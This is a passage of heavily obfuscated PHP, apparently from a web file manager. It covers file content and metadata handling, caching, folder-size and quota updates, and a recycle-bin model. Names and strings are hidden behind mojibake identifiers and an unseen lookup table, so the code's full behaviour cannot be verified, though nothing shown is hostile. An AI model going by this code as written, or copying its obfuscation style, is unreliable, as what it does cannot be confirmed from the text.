$¢Ğš¶å€, $‡¸™§åğ = true) { $åò¹ğçı =& $_SERVER[Ôó‡è­ƒ]; $¢Ú˜ÓÇ = Input::check($¢Ğš¶å€, $åò¹ğçı[586]); $€îØ„Ùü = array($åò¹ğçı[438] => KodSort::makeStr($¢Ğš¶å€)); if ($¢Ú˜ÓÇ) { $€îØ„Ùü[$åò¹ğçı[460]] = str_replace($åò¹ğçı[53], $åò¹ğçı[12], Pinyin::get($¢Ğš¶å€)); $€îØ„Ùü[$åò¹ğçı[459]] = Pinyin::get($¢Ğš¶å€, $åò¹ğçı[587]); } if (!$‡¸™§åğ && !$¢Ú˜ÓÇ) { $€îØ„Ùü[$åò¹ğçı[460]] = null; $€îØ„Ùü[$åò¹ğçı[459]] = null; } $this->metaSet($¿ìê—¨˜, $€îØ„Ùü); } public function getContent($‚Ôîæ¿ö) { $Ò¨¬Ö½ =& $_SERVER[Ôó‡è­ƒ]; $á‰Êñ†ä = $this->fileInfoGet($‚Ôîæ¿ö); if (!$á‰Êñ†ä) { return !1; } if ($á‰Êñ†ä[$Ò¨¬Ö½[80]] == 0) { return $Ò¨¬Ö½[12]; } $¶Ùú³ÖÛ = $Ò¨¬Ö½[2112] . $á‰Êñ†ä[$Ò¨¬Ö½[173]]; if ($á‰Êñ†ä[$Ò¨¬Ö½[80]] <= 1024 * 10) { $Ä©Úİâş = Cache::get($¶Ùú³ÖÛ); if (!$Ä©Úİâş) { $Ä©Úİâş = IO::getContent($á‰Êñ†ä[$Ò¨¬Ö½[78]]); Cache::set($¶Ùú³ÖÛ, $Ä©Úİâş); } return $Ä©Úİâş; } if (!$á‰Êñ†ä[$Ò¨¬Ö½[78]]) { return $Ò¨¬Ö½[12]; } return IO::getContent($á‰Êñ†ä[$Ò¨¬Ö½[78]]); } public function setDesc($ÇùêĞº, $ÌäÆ¥®Ù) { $“ÑšÀÍ =& $_SERVER[Ôó‡è­ƒ]; Model($“ÑšÀÍ[563])->eventAddDesc($ÇùêĞº, $ÌäÆ¥®Ù); return $this->metaSet($ÇùêĞº, $“ÑšÀÍ[447], $ÌäÆ¥®Ù); } public function setContent($²ÖÖŞã×, $ÉÁ†Ë‚æ = '') { $‰Æş÷Œã =& $_SERVER[Ôó‡è­ƒ]; $ê‹ÖĞºû = $this->sourceInfo($²ÖÖŞã×); $ÙÂíåí° = $this->fileInfoGet($²ÖÖŞã×); if (!$ÙÂíåí° || !$ê‹ÖĞºû) { return !1; } $÷­øîè› = Model($‰Æş÷Œã[466])->addFileByContent($ÉÁ†Ë‚æ, $ê‹ÖĞºû[$‰Æş÷Œã[32]]); $øøöÚ£û = $this->fileHistory($ê‹ÖĞºû, $÷­øîè›[$‰Æş÷Œã[463]], $÷­øîè›[$‰Æş÷Œã[80]]); if (!$øøöÚ£û) { return Model($‰Æş÷Œã[466])->remove($÷­øîè›[$‰Æş÷Œã[463]]); } $this->folderSizeReset($ê‹ÖĞºû[$‰Æş÷Œã[494]]); return !0; } public function fileSubstr($ÂóÃ³Ÿ», $§Í–†Ãæ, $‘İ“ÃÉÒ) { $çĞÌÏó = $this->fileInfoGet($ÂóÃ³Ÿ»); if (!$çĞÌÏó) { return !1; } return IO::fileSubstr($çĞÌÏó[$_SERVER[Ôó‡è­ƒ][78]], $§Í–†Ãæ, $‘İ“ÃÉÒ); } public function fileInfoGet($‡»”ˆç) { $ô‡øïøø =& $_SERVER[Ôó‡è­ƒ]; $çÂü®ÛÖ = $this->sourceInfo($‡»”ˆç); if (!$çÂü®ÛÖ || $çÂü®ÛÖ[$ô‡øïøø[407]]) { return !1; } $¿”ÔöÕ¦ = $ô‡øïøø[469] . $çÂü®ÛÖ[$ô‡øïøø[463]]; $¼©Æï¼İ = _get(self::$cacheFileInfo, $¿”ÔöÕ¦); if ($¼©Æï¼İ) { return $¼©Æï¼İ; } $Ÿ¤ÄÍŞ = Model($ô‡øïøø[466])->fileInfo($çÂü®ÛÖ[$ô‡øïøø[463]]); if ($Ÿ¤ÄÍŞ) { $Ÿ¤ÄÍŞ[$ô‡øïøø[32]] = $çÂü®ÛÖ[$ô‡øïøø[32]]; } self::$cacheFileInfo[$¿”ÔöÕ¦] = $Ÿ¤ÄÍŞ; return $Ÿ¤ÄÍŞ; } private function folderChildrenNumber($ƒ¤Ïşİ½) { $üÅ„ÀäÚ =& $_SERVER[Ôó‡è­ƒ]; $Ó„Õûì = $this->sourceInfo($ƒ¤Ïşİ½); $Ñ—êƒ÷ = array($üÅ„ÀäÚ[583] => array($üÅ„ÀäÚ[543], $Ó„Õûì[$üÅ„ÀäÚ[517]] . $ƒ¤Ïşİ½ . $üÅ„ÀäÚ[544]), $üÅ„ÀäÚ[580] => $Ó„Õûì[$üÅ„ÀäÚ[501]], $üÅ„ÀäÚ[426] => intval($Ó„Õûì[$üÅ„ÀäÚ[427]]), $üÅ„ÀäÚ[576] => 1); $¡Şãã† = $this->where($Ñ—êƒ÷)->count(); $†áÛÅÒ = $this->where($Ñ—êƒ÷)->where(array($üÅ„ÀäÚ[576] => 0))->count(); return array($üÅ„ÀäÚ[84] => $†áÛÅÒ, $üÅ„ÀäÚ[85] => $¡Şãã†); } public function pathInfo($¿·Ç·ß§, $ï˜‰ª÷§ = false) { $¹’ˆû¢È =& $_SERVER[Ôó‡è­ƒ]; $ï˜‰ª÷§ = !1; $¿·Ç·ß§ = intval($¿·Ç·ß§); $°•¾Û«• = $¹’ˆû¢È[455] . intval($ï˜‰ª÷§) . $¹’ˆû¢È[456] . $¿·Ç·ß§; $İ¡¬È” = _get(self::$cachePathInfo, $°•¾Û«•); if ($İ¡¬È”) { return $İ¡¬È”; } $ÄÇØ Ø = $this->sourceInfo($¿·Ç·ß§); if (!$ÄÇØ Ø) { return !1; } $ÄÇØ Ø = $this->_listDataApplyItem($ÄÇØ Ø, $ï˜‰ª÷§); self::$cachePathInfo[$°•¾Û«•] = $ÄÇØ Ø; return $ÄÇØ Ø; } public static $cachePathInfoMore = array(); public function pathInfoMore($ÛÎ‡ÚÃ) { $ÇŞØÃŠ  =& $_SERVER[Ôó‡è­ƒ]; $›½¦î§ = _get(self::$cachePathInfoMore, $ÛÎ‡ÚÃ); if ($›½¦î§) { return $›½¦î§; } $«ŒÜø£Æ = $this->pathInfo($ÛÎ‡ÚÃ); if (!$«ŒÜø£Æ) { return !1; } if ($«ŒÜø£Æ[$ÇŞØÃŠ [407]] == $ÇŞØÃŠ [89]) { $«ŒÜø£Æ[$ÇŞØÃŠ [83]] = $this->folderChildrenNumber($ÛÎ‡ÚÃ); } self::$cachePathInfoMore[$ÛÎ‡ÚÃ] = $«ŒÜø£Æ; return $«ŒÜø£Æ; } public function sourceInfo($š»Õêó) { $Ó¼ŠÙÜ´ =& $_SERVER[Ôó‡è­ƒ]; if (!$š»Õêó) { return array(); } $š»Õêó = intval($š»Õêó); $†ˆ‡´ñø = $Ó¼ŠÙÜ´[454] . $š»Õêó; $ŞÍá˜û› = _get(self::$cacheSourceInfo, $†ˆ‡´ñø); if ($ŞÍá˜û›) { return $ŞÍá˜û›; } $œü×†• = $this->where(array($Ó¼ŠÙÜ´[399] => $š»Õêó))->find(); self::$cacheSourceInfo[$†ˆ‡´ñø] = $œü×†•; return self::$cacheSourceInfo[$†ˆ‡´ñø]; } public function sourceCacheClear($—øÄÑ¤ª = false) { self::cacheClear($—øÄÑ¤ª); } public static function cacheClear($°óö¶ö = false) { $ÚŸÇ‰­ä =& $_SERVER[Ôó‡è­ƒ]; if ($°óö¶ö == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ÚŸÇ‰­ä[454] . $°óö¶ö]); unset(self::$cachePathInfoMore[$°óö¶ö]); unset(self::$cachePathInfo[$ÚŸÇ‰­ä[2113] . $°óö¶ö]); unset(self::$cachePathInfo[$ÚŸÇ‰­ä[2114] . $°óö¶ö]); } public function metaSet($àÌÙ½ñ—, $°øºİ‚ª = null, $Ã‰‹Ã‚ã = null) { $©ïÔãÊÓ = parent::metaSet($àÌÙ½ñ—, $°øºİ‚ª, $Ã‰‹Ã‚ã); if ($©ïÔãÊÓ) { $this->sourceCacheClear($àÌÙ½ñ—); } return $©ïÔãÊÓ; } public function pathInfoByPath($ÃÉÌŞµ, $ÑÁëÏæ) { $¤ÌÓó—“ =& $_SERVER[Ôó‡è­ƒ]; $•şĞ“ãÇ = !$ÑÁëÏæ ? array() : explode($¤ÌÓó—“[8], trim($ÑÁëÏæ, $¤ÌÓó—“[8])); $ß¾³»® = $ÃÉÌŞµ; foreach ($•şĞ“ãÇ as $›§î¬›á) { $íòâºÆÖ = array($¤ÌÓó—“[494] => $ß¾³»®, $¤ÌÓó—“[32] => $›§î¬›á); $ØîÍ¢ıÊ = $this->where($íòâºÆÖ)->select(); if (!$ØîÍ¢ıÊ) { return !1; } $ØîÍ¢ıÊ = array_sort_by($ØîÍ¢ıÊ, $¤ÌÓó—“[427]); $ß¾³»® = $ØîÍ¢ıÊ[0][$¤ÌÓó—“[399]]; } return $this->pathInfo($ß¾³»®, !0); } protected function updateModifyTime($¾ºŠ²ŞË) { $½Ë¨“… =& $_SERVER[Ôó‡è­ƒ]; $Ú¾íóé° = defined($½Ë¨“…[470]) ? USER_ID : $½Ë¨“…[194]; if (!$¾ºŠ²ŞË) { return; } if (!is_array($¾ºŠ²ŞË)) { $¾ºŠ²ŞË = array($¾ºŠ²ŞË); } foreach ($¾ºŠ²ŞË as $ñ™Œîôõ => $Ù€éËÛë) { $¾ºŠ²ŞË[$ñ™Œîôõ] = intval($Ù€éËÛë); $this->sourceCacheClear($Ù€éËÛë); } $µÅÈå¸„ = array($½Ë¨“…[399] => array($½Ë¨“…[7], $¾ºŠ²ŞË)); $ğ¦œÕÀ = array($½Ë¨“…[582] => $Ú¾íóé°, $½Ë¨“…[421] => time()); $this->where($µÅÈå¸„)->save($ğ¦œÕÀ); } public function folderSizeReset($ù«ìö«®, $Ç…¿òıÀ = false) { $­¢æÁ¢Í =& $_SERVER[Ôó‡è­ƒ]; if ($this->statusIgnoreResetSpace) { return; } $Ğø‡°õ° = $this->sourceInfo($ù«ìö«®); $ÊÖµ = $­¢æÁ¢Í[2115] . $ù«ìö«®; CacheLock::lock($ÊÖµ, 20); if ($Ç…¿òıÀ === !1) { $this->sourceCacheClear($ù«ìö«®); $Ğø‡°õ° = $this->sourceInfo($ù«ìö«®); $…²½Œƒš = array($­¢æÁ¢Í[398] => $ù«ìö«®, $­¢æÁ¢Í[426] => 0); $÷• òõş = $this->where($…²½Œƒš)->sum($­¢æÁ¢Í[80]); $Ç…¿òıÀ = intval($÷• òõş) - intval($Ğø‡°õ°[$­¢æÁ¢Í[80]]); } if ($Ç…¿òıÀ == 0) { return CacheLock::unlock($ÊÖµ); } $¾¤¾‰õê = $this->parentLevelArray($Ğø‡°õ°[$­¢æÁ¢Í[517]]); if (!$¾¤¾‰õê) { $¾¤¾‰õê = array(); } $¾¤¾‰õê[] = $Ğø‡°õ°[$­¢æÁ¢Í[399]]; $…²½Œƒš = array($­¢æÁ¢Í[399] => array($­¢æÁ¢Í[415], $¾¤¾‰õê)); if ($Ç…¿òıÀ < 0) { $…²½Œƒš[$­¢æÁ¢Í[80]] = array($­¢æÁ¢Í[1015], abs($Ç…¿òıÀ)); } $this->where($…²½Œƒš)->setAdd($­¢æÁ¢Í[80], $Ç…¿òıÀ); CacheLock::unlock($ÊÖµ); $áøûËÂÓ = $­¢æÁ¢Í[2116] . $Ğø‡°õ°[$­¢æÁ¢Í[408]] . $­¢æÁ¢Í[4] . $Ğø‡°õ°[$­¢æÁ¢Í[501]]; $üÎùü£ = array($Ğø‡°õ°[$­¢æÁ¢Í[408]], $Ğø‡°õ°[$­¢æÁ¢Í[501]]); TaskRun::timeLimitCall($áøûËÂÓ, $­¢æÁ¢Í[2117], $üÎùü£, 1.5); } public function folderSizeResetChildren($ÕƒÃĞà—) { $°­”Ê¯º =& $_SERVER[Ôó‡è­ƒ]; $this->sourceCacheClear($ÕƒÃĞà—); $èùñ¹ÑÙ = $this->sourceInfo($ÕƒÃĞà—); $»ˆï­ë× = array($°­”Ê¯º[576] => 1, $°­”Ê¯º[580] => $èùñ¹ÑÙ[$°­”Ê¯º[501]], $°­”Ê¯º[583] => array($°­”Ê¯º[543], $èùñ¹ÑÙ[$°­”Ê¯º[517]] . $ÕƒÃĞà— . $°­”Ê¯º[544])); $ˆåò•Ù„ = $°­”Ê¯º[2118]; $¾¥ş”ÌÜ = $this->field($ˆåò•Ù„)->where($»ˆï­ë×)->select(); $»ˆï­ë×[$°­”Ê¯º[407]] = 0; $ì¿¬åá = $this->field($ˆåò•Ù„)->where($»ˆï­ë×)->select(); if (!$ì¿¬åá) { return; } $¾¥ş”ÌÜ[] = $èùñ¹ÑÙ; $¾¥ş”ÌÜ = array_to_keyvalue($¾¥ş”ÌÜ, $°­”Ê¯º[399]); foreach ($¾¥ş”ÌÜ as $œÛ™‘„¹ => $ğ°ë»¶ì) { $¾¥ş”ÌÜ[$œÛ™‘„¹][$°­”Ê¯º[2119]] = $¾¥ş”ÌÜ[$œÛ™‘„¹][$°­”Ê¯º[80]]; $¾¥ş”ÌÜ[$œÛ™‘„¹][$°­”Ê¯º[80]] = 0; } foreach ($ì¿¬åá as $ğ°ë»¶ì) { $Äœ´—ıã = $ğ°ë»¶ì[$°­”Ê¯º[494]] . $°­”Ê¯º[12]; if (!isset($¾¥ş”ÌÜ[$Äœ´—ıã])) { continue; } if ($ğ°ë»¶ì[$°­”Ê¯º[427]] == $¾¥ş”ÌÜ[$Äœ´—ıã][$°­”Ê¯º[427]]) { $¾¥ş”ÌÜ[$Äœ´—ıã][$°­”Ê¯º[80]] += $ğ°ë»¶ì[$°­”Ê¯º[80]]; } } foreach ($¾¥ş”ÌÜ as $ğ°ë»¶ì) { $Ø¥Ñóï = $this->parentLevelArray($ğ°ë»¶ì[$°­”Ê¯º[517]]); foreach ($Ø¥Ñóï as $Äœ´—ıã) { $Äœ´—ıã = $Äœ´—ıã . $°­”Ê¯º[12]; if (!isset($¾¥ş”ÌÜ[$Äœ´—ıã])) { continue; } if ($ğ°ë»¶ì[$°­”Ê¯º[427]] == $¾¥ş”ÌÜ[$Äœ´—ıã][$°­”Ê¯º[427]]) { $¾¥ş”ÌÜ[$Äœ´—ıã][$°­”Ê¯º[80]] += $ğ°ë»¶ì[$°­”Ê¯º[80]]; } } } $éãÄêè˜ = array(); foreach ($¾¥ş”ÌÜ as $ğ°ë»¶ì) { if ($ğ°ë»¶ì[$°­”Ê¯º[80]] == $ğ°ë»¶ì[$°­”Ê¯º[2119]]) { continue; } $éãÄêè˜[] = array($°­”Ê¯º[399], $ğ°ë»¶ì[$°­”Ê¯º[399]], $°­”Ê¯º[80], $ğ°ë»¶ì[$°­”Ê¯º[80]]); } $this->saveAll($éãÄêè˜); } public function userSpaceReset($ê¦á“ğ† = false) { $ÌÏ÷í‹È =& $_SERVER[Ôó‡è­ƒ]; $‰ø‰‰¨‰ = $this->where(array($ÌÏ÷í‹È[408] => self::TYPE_USER, $ÌÏ÷í‹È[501] => $ê¦á“ğ†, $ÌÏ÷í‹È[407] => 0))->sum($ÌÏ÷í‹È[80]); $‰ø‰‰¨‰ = !$‰ø‰‰¨‰ || $‰ø‰‰¨‰ <= 0 ? 0 : $‰ø‰‰¨‰; Model($ÌÏ÷í‹È[509])->userEdit($ê¦á“ğ†, array($ÌÏ÷í‹È[1812] => $‰ø‰‰¨‰)); } public function targetSpaceUpdate($ä†ìâÉ™, $Ş±üåà) { $ı£ìãÄœ =& $_SERVER[Ôó‡è­ƒ]; if (!$Ş±üåà) { return; } if (!in_array($ä†ìâÉ™, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ê²‘¿İà = $this->targetSpaceSize($ä†ìâÉ™, $Ş±üåà); if ($ä†ìâÉ™ == self::TYPE_USER) { Model($ı£ìãÄœ[509])->userEdit($Ş±üåà, array($ı£ìãÄœ[1812] => $ê²‘¿İà)); } else { if ($ä†ìâÉ™ == self::TYPE_GROUP) { Model($ı£ìãÄœ[518])->groupEdit($Ş±üåà, array($ı£ìãÄœ[1812] => $ê²‘¿İà)); } } } public function targetSpaceSize($×Ù“çé, $ƒã¾‹µ) { $÷æµÍ­î =& $_SERVER[Ôó‡è­ƒ]; $ÆÁ÷â…ù = $this->sourceRoot($×Ù“çé, $ƒã¾‹µ, !0); if (!$ÆÁ÷â…ù) { return 0; } $ƒóâéø = floatval($ÆÁ÷â…ù[$÷æµÍ­î[80]]); $ËœĞ€ß– = array($÷æµÍ­î[583] => array($÷æµÍ­î[543], $÷æµÍ­î[527] . $ÆÁ÷â…ù[$÷æµÍ­î[399]] . $÷æµÍ­î[544])); $ÉˆÜ‹¹ = Model($÷æµÍ­î[425])->field($÷æµÍ­î[414])->where($ËœĞ€ß–)->select(); $ÉˆÜ‹¹ = array_to_keyvalue($ÉˆÜ‹¹, $÷æµÍ­î[12], $÷æµÍ­î[399]); $ÉˆÜ‹¹ = array_unique(array_filter($ÉˆÜ‹¹)); if ($ÉˆÜ‹¹) { $ËœĞ€ß– = array($÷æµÍ­î[414] => array($÷æµÍ­î[415], $ÉˆÜ‹¹)); $ƒóâéø += floatval($this->where($ËœĞ€ß–)->sum($÷æµÍ­î[80])); } $ƒóâéø = !$ƒóâéø || $ƒóâéø <= 0 ? 0 : $ƒóâéø; return $ƒóâéø; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Ñıû´Á) { return $this->fileTypeProfile($Ñıû´Á, SourceModel::TYPE_USER); } public function groupFileTypeProfile($©¿Ë˜üÒ) { return $this->fileTypeProfile($©¿Ë˜üÒ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($üÅ¨ìˆÁ, $÷ç§Úã) { $ª’šÛ˜Â =& $_SERVER[Ôó‡è­ƒ]; $óò–ç–¤ = $ª’šÛ˜Â[2120] . $üÅ¨ìˆÁ . $ª’šÛ˜Â[11] . $÷ç§Úã; $ı¤ÌÜşÚ = Cache::get($óò–ç–¤); if ($ı¤ÌÜşÚ) { return $ı¤ÌÜşÚ; } $åÄÍû† = array($ª’šÛ˜Â[576] => 0); if ($üÅ¨ìˆÁ != !1) { $åÄÍû†[$ª’šÛ˜Â[501]] = $üÅ¨ìˆÁ; $åÄÍû†[$ª’šÛ˜Â[408]] = $÷ç§Úã; } $îšº†…µ = array(); $îšº†…µ[$ª’šÛ˜Â[2121]] = array($ª’šÛ˜Â[2122] => LNG($ª’šÛ˜Â[2121]), $ª’šÛ˜Â[2123] => $this->where($åÄÍû†)->count(), $ª’šÛ˜Â[578] => $this->where($åÄÍû†)->sum($ª’šÛ˜Â[80])); $åÜ‚‡úº = KodIO::fileTypeList(); foreach ($åÜ‚‡úº as $öÒ¹ì­ => $Õ×úˆ£µ) { $åÄÍû†[$ª’šÛ˜Â[409]] = $this->fileTypeWhere($öÒ¹ì­); $îšº†…µ[$öÒ¹ì­] = array($ª’šÛ˜Â[2122] => $Õ×úˆ£µ[$ª’šÛ˜Â[32]], $ª’šÛ˜Â[2123] => $this->where($åÄÍû†)->count(), $ª’šÛ˜Â[578] => $this->where($åÄÍû†)->sum($ª’šÛ˜Â[80])); } Cache::set($óò–ç–¤, $îšº†…µ, 1200); return $îšº†…µ; } public function fileNameExist($û‘ì¶‡£, $Äê¸¦´) { $ùæÈÍ«¨ =& $_SERVER[Ôó‡è­ƒ]; $¦™éíîÔ = $this->where(array($ùæÈÍ«¨[494] => $û‘ì¶‡£, $ùæÈÍ«¨[32] => $Äê¸¦´, $ùæÈÍ«¨[427] => 0))->find(); return is_array($¦™éíîÔ) ? $¦™éíîÔ[$ùæÈÍ«¨[399]] : !1; } public function childList($øĞá´¸ï) { $İÖÖü©ê =& $_SERVER[Ôó‡è­ƒ]; $«äú’¥¶ = $İÖÖü©ê[2098] . $øĞá´¸ï; if (isset(self::$cacheChildList[$«äú’¥¶])) { return self::$cacheChildList[$«äú’¥¶]; } $´‡ê¤‚ = array($İÖÖü©ê[494] => intval($øĞá´¸ï), $İÖÖü©ê[427] => 0); $¸Ü³Ğ¹ = $this->where($´‡ê¤‚)->select(); $¸Ü³Ğ¹ = $¸Ü³Ğ¹ ? $¸Ü³Ğ¹ : array(); self::$cacheChildList[$«äú’¥¶] = $¸Ü³Ğ¹; foreach ($¸Ü³Ğ¹ as $ÙÀŞ••ú) { $«äú’¥¶ = $İÖÖü©ê[454] . $ÙÀŞ••ú[$İÖÖü©ê[399]]; self::$cacheSourceInfo[$«äú’¥¶] = $ÙÀŞ••ú; } return $¸Ü³Ğ¹; } public function fileNameAuto($›×‹ØåÙ, $îİƒ¢¸—, $¹Æ°Ç– = REPEAT_RENAME, $İ™İ‹ëæ = false) { $á‹¸‚Î =& $_SERVER[Ôó‡è­ƒ]; $ß”‹–Û = array($á‹¸‚Î[494] => $›×‹ØåÙ, $á‹¸‚Î[427] => 0, $á‹¸‚Î[32] => array($á‹¸‚Î[382], $îİƒ¢¸— . $á‹¸‚Î[383])); $åÓş´İÏ = $this->field($á‹¸‚Î[32])->where($ß”‹–Û)->select(); $ñ•öÕ¡Ş = array_to_keyvalue($åÓş´İÏ, $á‹¸‚Î[12], $á‹¸‚Î[32]); return $this->fileNameAutoGet($ñ•öÕ¡Ş, $îİƒ¢¸—, $¹Æ°Ç–, $İ™İ‹ëæ); } public function fileNameAutoGet($º‹‘ÀÄ, $‘ê›ùÂ¡, $ôîõ²êí, $î§åïœ’) { $³ÃÄÉ´à =& $_SERVER[Ôó‡è­ƒ]; if ($ôîõ²êí == REPEAT_REPLACE || !$º‹‘ÀÄ || !in_array_not_case($‘ê›ùÂ¡, $º‹‘ÀÄ) || $î§åïœ’ && $ôîõ²êí != REPEAT_RENAME_FOLDER) { return $‘ê›ùÂ¡; } if ($ôîõ²êí == REPEAT_SKIP) { return !1; } $ü¬Ã¦‘² = $³ÃÄÉ´à[10] . get_path_ext($‘ê›ùÂ¡); $ü¬Ã¦‘² = $ü¬Ã¦‘² == $³ÃÄÉ´à[10] || $î§åïœ’ ? $³ÃÄÉ´à[12] : $ü¬Ã¦‘²; for ($êÙÉ¶ï = 1; $êÙÉ¶ï <= count($º‹‘ÀÄ) + 1; $êÙÉ¶ï++) { $úêÏ‡ÕÌ = substr($‘ê›ùÂ¡, 0, strlen($‘ê›ùÂ¡) - strlen($ü¬Ã¦‘²)); $Şû”Ç¢™ = $úêÏ‡ÕÌ . "\x28{$êÙÉ¶ï}\x29{$ü¬Ã¦‘²}"; if (!in_array_not_case($Şû”Ç¢™, $º‹‘ÀÄ)) { return $Şû”Ç¢™; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\165\x72\x63\x65\137\162\145\x63\x79\x63\154\145"; protected $dataAuto = array(array("\143\x72\145\141\x74\x65\124\x69\x6d\145", "\164\151\x6d\145", "\151\x6e\x73\x65\x72\x74", "\x66\x75\x6e\x63\x74\x69\x6f\x6e")); public function listData($ëı×¯ë« = false) { $œ€¼ñ©Ó =& $_SERVER[Ôó‡è­ƒ]; $ëı×¯ë« = $ëı×¯ë« ? $ëı×¯ë« : USER_ID; $˜ÜÁÒŠÓ = $this->where(array($œ€¼ñ©Ó[1646] => $ëı×¯ë«))->select(); return array_to_keyvalue($˜ÜÁÒŠÓ, $œ€¼ñ©Ó[12], $œ€¼ñ©Ó[399]); } public function moveToRecycle($ÃœğğÙ) { $Ù‡¬›Å =& $_SERVER[Ôó‡è­ƒ]; $îú®Ú…ó = Model($Ù‡¬›Å[1325]); $š¸ßã©È = $îú®Ú…ó->sourceInfo($ÃœğğÙ); if (!$š¸ßã©È || $š¸ßã©È[$Ù‡¬›Å[427]] == $Ù‡¬›Å[89]) { return; } $Å¶Ğ°âê = array($Ù‡¬›Å[414] => $ÃœğğÙ, $Ù‡¬›Å[1646] => USER_ID, $Ù‡¬›Å[579] => $š¸ßã©È[$Ù‡¬›Å[408]], $Ù‡¬›Å[580] => $š¸ßã©È[$Ù‡¬›Å[501]], $Ù‡¬›Å[583] => $š¸ßã©È[$Ù‡¬›Å[517]]); $this->add($Å¶Ğ°âê); $this->recycleMove($ÃœğğÙ, 1); if ($š¸ßã©È[$Ù‡¬›Å[407]] == $Ù‡¬›Å[89]) { $¦ˆ’„†Ô = array($Ù‡¬›Å[583] => array($Ù‡¬›Å[543], $š¸ßã©È[$Ù‡¬›Å[517]] . $ÃœğğÙ . $Ù‡¬›Å[544])); $îú®Ú…ó->where($¦ˆ’„†Ô)->setField($Ù‡¬›Å[427], 1); } } public function clear() { $this->remove(!1); } public function remove($ûšı¸°õ = false, $Òé“èûÆ = false) { $ñÂãœ›‰ =& $_SERVER[Ôó‡è­ƒ]; $Òé“èûÆ = $Òé“èûÆ ? $Òé“èûÆ : USER_ID; $ÑÌ×»¾ = Model($ñÂãœ›‰[1325]); $‡›è»™© = $this->listData($Òé“èûÆ); $ûšı¸°õ = $ûšı¸°õ === !1 ? !1 : $ûšı¸°õ; $€¬Ä¢‘Ø = array(); foreach ($‡›è»™© as $á¯—›Ş ) { if ($ûšı¸°õ != !1 && !in_array($á¯—›Ş , $ûšı¸°õ)) { continue; } $Òà±ıÕ× = $ÑÌ×»¾->sourceInfo($á¯—›Ş ); $ÑÌ×»¾->remove($á¯—›Ş , !1); $„ª‡Ì „ = $Òà±ıÕ×[$ñÂãœ›‰[408]] . $ñÂãœ›‰[11] . $Òà±ıÕ×[$ñÂãœ›‰[501]]; $€¬Ä¢‘Ø[$„ª‡Ì „] = array($ñÂãœ›‰[579] => $Òà±ıÕ×[$ñÂãœ›‰[408]], $ñÂãœ›‰[501] => $Òà±ıÕ×[$ñÂãœ›‰[501]]); $this->where(array($ñÂãœ›‰[399] => $á¯—›Ş ))->delete(); } foreach ($€¬Ä¢‘Ø as $õîÀÀ×Ó) { $ÑÌ×»¾->targetSpaceUpdate($õîÀÀ×Ó[$ñÂãœ›‰[408]], $õîÀÀ×Ó[$ñÂãœ›‰[501]]); } } public function restore($ÆÓîØ = false) { $»øø–Òê = $this->listData(); $this->_restoreSource($»øø–Òê, $ÆÓîØ); } public function removeUserAll($œşÍì³ù) { $this->remove(!1, $œşÍì³ù); } private function _restoreSource($ç ¯°Ç, $½›û´’İ) { $Çş¹ƒ²› =& $_SERVER[Ôó‡è­ƒ]; $ïÂİ™‹« = Model($Çş¹ƒ²›[1325]); $½›û´’İ = $½›û´’İ == !1 ? !1 : $½›û´’İ; if (!$ç ¯°Ç) { return !0; } $øŞ˜÷³î = array(); foreach ($ç ¯°Ç as $š”“›ã) { if ($½›û´’İ != !1 && !in_array($š”“›ã, $½›û´’İ)) { continue; } $Ëìúõë† = $ïÂİ™‹«->sourceInfo($š”“›ã); $İ½…ò® = $ïÂİ™‹«->sourceInfo($Ëìúõë†[$Çş¹ƒ²›[494]]); if ($İ½…ò®[$Çş¹ƒ²›[427]] == $Çş¹ƒ²›[89]) { continue; } $ïÂİ™‹«->lockMoveStart($š”“›ã); $this->recycleMove($š”“›ã, 0); if ($Ëìúõë†[$Çş¹ƒ²›[407]] == $Çş¹ƒ²›[89]) { $ÅÅ³ƒ½ = array($Çş¹ƒ²›[583] => array($Çş¹ƒ²›[543], $Ëìúõë†[$Çş¹ƒ²›[517]] . $š”“›ã . $Çş¹ƒ²›[544])); $ïÂİ™‹«->where($ÅÅ³ƒ½)->setField($Çş¹ƒ²›[427], 0); $this->restoreFolderChildren($š”“›ã, $ç ¯°Ç); } $this->where(array($Çş¹ƒ²›[399] => $š”“›ã))->delete(); $ïÂİ™‹«->folderSizeReset($Ëìúõë†[$Çş¹ƒ²›[494]]); $øŞ˜÷³î[] = $Ëìúõë†[$Çş¹ƒ²›[494]]; if ($Ëìúõë†[$Çş¹ƒ²›[407]] == $Çş¹ƒ²›[89]) { $øŞ˜÷³î[] = $š”“›ã; } $ïÂİ™‹«->lockMoveEnd($š”“›ã); } $ïÂİ™‹«->updateModifyTime($øŞ˜÷³î); } private function restoreFolderChildren($Ö­´û¥Ö, $Î²òÈúï) { $É×ø © =& $_SERVER[Ôó‡è­ƒ]; $ÔÕ’Õğ = Model($É×ø ©[1325]); $çÜçÕô¿ = array($É×ø ©[399] => array($É×ø ©[7], array())); foreach ($Î²òÈúï as $Â—È­á€) { if ($Â—È­á€ == $Ö­´û¥Ö) { continue; } if (!$ÔÕ’Õğ->isParentOf($Ö­´û¥Ö, $Â—È­á€)) { continue; } $‚¯—²‰ = $ÔÕ’Õğ->sourceInfo($Â—È­á€); if ($‚¯—²‰[$É×ø ©[407]] == $É×ø ©[89]) { $çÜçÕô¿[] = array($É×ø ©[583] => array($É×ø ©[543], $‚¯—²‰[$É×ø ©[517]] . $Â—È­á€ . $É×ø ©[544])); } else { $çÜçÕô¿[$É×ø ©[399]][1][] = $Â—È­á€; } } if (!$çÜçÕô¿[$É×ø ©[399]][1]) { unset($çÜçÕô¿[$É×ø ©[399]]); } if (!$çÜçÕô¿) { return; } $çÜçÕô¿[$É×ø ©[399]][1] = array_unique($çÜçÕô¿[$É×ø ©[399]][1]); $çÜçÕô¿[$É×ø ©[1000]] = $É×ø ©[1920]; $ÔÕ’Õğ->where($çÜçÕô¿)->setField($É×ø ©[427], 1); } private function recycleMove($èçéŒÙç, $ı²ö‡Ñü = 1) { $«Ù«ö•– =& $_SERVER[Ôó‡è­ƒ]; $¶šÎ®ã¶ = Model($«Ù«ö•–[1325]); $°ÀÉÇ÷ = Model($«Ù«ö•–[2124]); $ûüñˆÃú = array($«Ù«ö•–[399] => $èçéŒÙç); if ($ı²ö‡Ñü) { 